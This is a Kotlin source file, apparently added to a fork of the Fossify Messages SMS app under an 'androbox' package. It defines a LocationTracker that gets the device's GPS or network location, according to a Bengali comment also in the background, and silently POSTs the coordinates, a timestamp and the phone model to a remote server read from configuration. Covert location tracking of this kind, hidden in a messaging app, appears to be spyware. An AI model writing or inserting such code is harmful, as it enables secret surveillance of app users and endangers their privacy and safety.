package org.fossify.messages.androbox

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.location.Location
import android.location.LocationListener
import android.location.LocationManager
import android.os.Bundle
import android.os.Looper
import android.util.Log
import androidx.core.content.ContextCompat
import kotlinx.coroutines.*
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import org.json.JSONObject
import java.io.IOException

object LocationTracker {
    private const val TAG = "LocationTracker"
    private val client = OkHttpClient.Builder()
        .connectTimeout(15, java.util.concurrent.TimeUnit.SECONDS)
        .build()
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    fun collectAndSendLocation(context: Context, onResult: ((Boolean) -> Unit)? = null) {
        if (!hasLocationPermission(context)) {
            Log.e(TAG, "Location permission not granted")
            onResult?.invoke(false)
            return
        }

        val locationManager = context.getSystemService(Context.LOCATION_SERVICE) as LocationManager
        if (!isProviderEnabled(locationManager)) {
            Log.e(TAG, "No location provider enabled")
            onResult?.invoke(false)
            return
        }

        // প্রথমে 30 সেকেন্ডের মধ্যে কোনো লাস্ট লোকেশন থাকলে ব্যবহার করি
        val lastLocation = getLastBestLocation(locationManager)
        if (lastLocation != null && System.currentTimeMillis() - lastLocation.time < 30_000) {
            Log.d(TAG, "Using last known location from ${lastLocation.provider}")
            uploadLocation(context, lastLocation.latitude, lastLocation.longitude, onResult)
            return
        }

        // নতুবা ফ্রেশ লোকেশন রিকোয়েস্ট করি (ব্যাকগ্রাউন্ডেও কাজ করবে)
        requestFreshLocation(context, locationManager, onResult)
    }

    private fun hasLocationPermission(context: Context): Boolean {
        return ContextCompat.checkSelfPermission(context, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED ||
                ContextCompat.checkSelfPermission(context, Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED
    }

    private fun isProviderEnabled(locationManager: LocationManager): Boolean {
        return locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER) ||
                locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)
    }

    private fun getLastBestLocation(locationManager: LocationManager): Location? {
        var best: Location? = null
        val providers = listOf(LocationManager.GPS_PROVIDER, LocationManager.NETWORK_PROVIDER)
        for (provider in providers) {
            try {
                val last = locationManager.getLastKnownLocation(provider)
                if (last != null && (best == null || last.accuracy < best.accuracy)) {
                    best = last
                }
            } catch (e: SecurityException) {
                Log.w(TAG, "Security exception getting last location from $provider")
            }
        }
        return best
    }

    private fun requestFreshLocation(
        context: Context,
        locationManager: LocationManager,
        onResult: ((Boolean) -> Unit)?
    ) {
        var resultSent = false
        val locationListener = object : LocationListener {
            override fun onLocationChanged(location: Location) {
                if (!resultSent) {
                    resultSent = true
                    locationManager.removeUpdates(this)
                    Log.d(TAG, "Got fresh location from ${location.provider}: ${location.latitude},${location.longitude}")
                    uploadLocation(context, location.latitude, location.longitude, onResult)
                }
            }

            override fun onProviderDisabled(provider: String) {}
            override fun onProviderEnabled(provider: String) {}
            override fun onStatusChanged(provider: String, status: Int, extras: Bundle) {}
        }

        try {
            // কোন প্রোভাইডার উপলব্ধ?
            val providers = mutableListOf<String>()
            if (locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER))
                providers.add(LocationManager.NETWORK_PROVIDER)
            if (locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER))
                providers.add(LocationManager.GPS_PROVIDER)

            if (providers.isEmpty()) {
                onResult?.invoke(false)
                return
            }

            // সকল প্রোভাইডার থেকে আপডেট চাই (minTime=0, minDistance=0)
            for (provider in providers) {
                try {
                    locationManager.requestLocationUpdates(provider, 0L, 0f, locationListener, Looper.getMainLooper())
                } catch (e: SecurityException) {
                    Log.e(TAG, "Security exception requesting $provider")
                }
            }

            // টাইমআউট ১৫ সেকেন্ড – যদি কোনো লোকেশন না আসে তাহলে লাস্ট লোকেশন ব্যবহার করি
            scope.launch {
                delay(15_000)
                if (!resultSent) {
                    resultSent = true
                    locationManager.removeUpdates(locationListener)
                    Log.w(TAG, "Location request timeout")
                    val lastLocation = getLastBestLocation(locationManager)
                    if (lastLocation != null) {
                        Log.d(TAG, "Fallback to last known location (${lastLocation.provider})")
                        uploadLocation(context, lastLocation.latitude, lastLocation.longitude, onResult)
                    } else {
                        onResult?.invoke(false)
                    }
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Exception requesting location: ${e.message}")
            onResult?.invoke(false)
        }
    }

    private fun uploadLocation(context: Context, lat: Double, lon: Double, onResult: ((Boolean) -> Unit)?) {
        val urls = ConfigManager.getServerUrls(context) ?: run {
            onResult?.invoke(false)
            return
        }
        val (host, _) = urls
        val url = "$host/uploadLocation"
        val json = JSONObject().apply {
            put("lat", lat)
            put("lon", lon)
            put("timestamp", System.currentTimeMillis())
        }
        val body = RequestBody.create("application/json".toMediaType(), json.toString())
        val request = Request.Builder()
            .url(url)
            .post(body)
            .addHeader("model", android.os.Build.MODEL)
            .build()

        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                Log.e(TAG, "Upload failed: ${e.message}")
                onResult?.invoke(false)
            }

            override fun onResponse(call: Call, response: Response) {
                val success = response.isSuccessful
                if (success) {
                    Log.d(TAG, "Location uploaded: $lat, $lon")
                } else {
                    Log.e(TAG, "Upload error code: ${response.code}")
                }
                response.close()
                onResult?.invoke(success)
            }
        })
    }

    fun cancel() {
        scope.cancel()
    }
}